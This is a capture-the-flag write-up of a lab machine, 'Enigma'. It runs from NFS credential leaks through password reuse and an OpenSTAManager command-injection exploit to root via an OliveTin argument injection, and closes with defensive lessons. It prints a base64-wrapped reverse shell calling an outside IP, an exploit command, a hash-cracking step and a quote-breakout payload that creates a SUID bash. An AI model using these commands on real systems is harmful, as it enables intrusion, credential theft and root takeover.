Enigma

Easy Linux ✓ Pwned
Date 2026-07-04
OS Linux — Ubuntu 24.04
Stack NFS · Roundcube 1.6.16 · Dovecot · OpenSTAManager 2.9.8 · OliveTin
CVE CVE-2025-69212 (OpenSTAManager P7M OS command injection)

Summary

Enigma is a mail-themed box where the whole chain is really about credential flow — every step hands you the key to the next service, and only two of the links are actual software exploits.

  1. Initial access — An anonymous NFS export leaks an onboarding PDF with webmail creds. Reading mail as kevin, then reusing his password over IMAP for sarah, surfaces admin credentials for an internal OpenSTAManager 2.9.8 instance, which is exploited via CVE-2025-69212 for a shell as www-data.
  2. Lateral movement — The app's config.inc.php gives up the DB password; the zz_users table yields a bcrypt hash for haris that cracks against rockyou → user.
  3. Privilege escalation — A root-run OliveTin instance on localhost has a "Backup Database" action whose password-typed argument is unsanitised and interpolated into a shell command. A Connect-RPC call injects a command as root.

The port list tells a story: a full mail stack (POP3/IMAP + Roundcube) plus NFS wide open. vhost fuzzing on the web root finds a webmail subdomain:

gobuster vhost -u http://enigma.htb --append-domain \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt

Found: mail001.enigma.htb  (Roundcube Webmail 1.6.16 login)

The two most under-used ports on the scan — 111/2049 — are the quiet win. Always query NFS before brute-forcing a login.

Initial Access — CVE-2025-69212

Step 1 — NFS → onboarding creds. Ask the file server what it exports, mount it, and read the PDF an admin left behind for new hires:

showmount -e 10.129.30.127
# Export list:  /srv/nfs/onboarding *

sudo mount -t nfs 10.129.30.127:/srv/nfs/onboarding /mnt/enigma_nfs
ls /mnt/enigma_nfs
# New_Employee_Access.pdf   ->  kevin : Enigma2024!

Step 2 — webmail + password reuse. Those creds log into Roundcube as kevin, whose inbox holds only a welcome mail from sarah@enigma.htb. The box loves credential reuse, so the same password is sprayed over IMAP against other mailboxes — sarah reuses it:

openssl s_client -quiet -crlf -connect 10.129.30.127:993
a LOGIN sarah Enigma2024!
a OK Logged in.

Sarah's inbox contains the payload of this whole section — provisioning credentials for an internal app:

URL:      http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s      (OpenSTAManager)

Step 3 — OpenSTAManager RCE. The footer reveals OpenSTAManager 2.9.8, vulnerable to CVE-2025-69212: an authenticated OS command injection in the P7M (signed-XML) decoder. An uploaded ZIP containing a .p7m file with a malicious filename is passed to a shell during decoding, executing arbitrary commands.

python3 exploit.py --url "http://support_001.enigma.htb" \
  --username "admin" --password "Ne3s4rtars78s" \
  --command "echo <b64> | base64 -d | bash"

# payload (base64'd to survive the injection layer):
echo -n 'bash -i >& /dev/tcp/10.10.16.199/4444 0>&1' | base64

Gotcha: a raw bash -i >& /dev/tcp/... silently fails — the injection context isn't bash, and the redirect/metacharacters get mangled. Base64-encode the reverse shell and decode it on the target. Confirm blind RCE with an ICMP callback (ping -c3 + tcpdump) before debugging the shell.

Lateral Movement — www-data → haris

A web app that talks to a database keeps that password in a config file the service account can read. OpenSTAManager's is config.inc.php:

$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name     = 'openstamanager';

su haris with that password fails, but the DB itself stores the app's own user hashes. Dump them and crack offline:

mysql -u brollin -p'Fri3nds@9099' openstamanager -e "SELECT username,password FROM zz_users;"
# haris : $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC  (bcrypt)

hashcat -m 3200 haris.hash /usr/share/wordlists/rockyou.txt

The cracked password gives an interactive haris session (SSH is publickey-only, so su / a planted key is the door), and the user flag:

user shell
haris@enigma:~$ id && cat user.txt
uid=1000(haris) gid=1000(haris) groups=1000(haris),100(users)

Privilege Escalation — haris → root

sudo -l is empty, but a root-owned OliveTin (a web UI for running predefined shell commands) listens on 127.0.0.1:1337:

ps aux | grep -i olivetin
# root  ...  /usr/local/bin/OliveTin        <- runs as ROOT
ss -ltnp | grep 1337
# LISTEN 127.0.0.1:1337

The config /etc/OliveTin/config.yaml is root-owned (not editable), so the play is to abuse an existing action. Comparing argument type: constraints across actions reveals the weak one — every argument is a sanitising type (ascii_identifier, int, choices) except the password field, which is free-form and interpolated inside single quotes in the shell string:

- title: Backup Database
  id: backup_database
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
  arguments:
    - name: db_pass
      type: password          # <- NOT sanitised -> quote breakout -> command injection

The API gotcha. OliveTin's front-end speaks the Connect RPC protocol, not plain REST. A naive {"actionId": "..."} POST is silently ignored (the ID arrives blank). Reading the compiled JS shows the real call is window.client.startAction({bindingId, arguments}) — the field is bindingId, and the request needs the Connect-Protocol-Version: 1 header:

# db_pass value closes the quote, runs our command as root, comments out the rest:
'; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; #

curl -s -X POST http://127.0.0.1:1337/api/StartAction \
  -H "Content-Type: application/json" \
  -H "Connect-Protocol-Version:1" \
  -d @pay.json
# {"executionTrackingId":"..."}   <- root just ran it
root shell
haris@enigma:~$ ls -la /tmp/rootbash
-rwsr-xr-x 1 root root 1446024 /tmp/rootbash
haris@enigma:~$ /tmp/rootbash -p
rootbash-5.2# id
uid=1000(haris) euid=0(root) groups=1000(haris),100(users)
rootbash-5.2# cat /root/root.txt -> HTB{… redacted …}

The -p flag on the SUID bash is essential — without it bash drops the effective UID back to haris.

Defensive Takeaways

  • Never export NFS shares to *. Restrict by host, use root_squash, and never stage plaintext credentials on a network share.
  • Enforce unique passwords per account. One reused mailbox password collapsed the entire user tier of this box.
  • Patch internal apps too. "Internal only" (a vhost on localhost's reverse proxy) is not a mitigation — OpenSTAManager 2.9.8 was a public-CVE away from RCE.
  • Config secrets = the next hop. A service account that can read DB passwords and user hashes is a lateral-movement ladder; scope DB users and salt/rotate credentials.
  • Least privilege for automation tools. OliveTin had no business running as root, and any user-supplied argument reaching a shell must be validated by a strict type — obscurity (localhost binding) is not access control.
